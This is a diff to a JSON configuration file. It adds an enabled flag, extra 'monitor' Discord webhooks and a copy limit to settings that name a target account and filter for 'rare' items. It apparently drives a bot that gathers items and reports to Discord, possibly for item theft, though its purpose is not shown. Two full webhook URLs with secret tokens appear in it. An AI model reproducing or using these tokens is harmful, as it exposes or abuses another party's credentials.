@@ -1,12 +1,17 @@
 {
+  "enabled": true,
   "targets": ["Viivik13"],
   "webhooks": [
     "https://discord.com/api/webhooks/1575855895051632741/-Yz2VwHkH4CMJox6iQn1wKYq8U1QAafm_CsTfj7DeHBQvAif7K1PBKZUr5noSfDeXnf7"
+  ],
+  "monitor_webhooks": [
+    "https://discord.com/api/webhooks/1575868600294707380/xa_GJ6RoV2j2LbxRaYGj2VOt2kX8tlwi0ZHilbULi4NvJg5hmKEUJtIp3OuqQN68BY7u"
   ],
   "filter": "rare",
   "fallback_all": false,
   "min_value": 0,
   "max_items": 40,
+  "max_copies": 99,
   "max_rounds": 12,
   "debug": true
 }
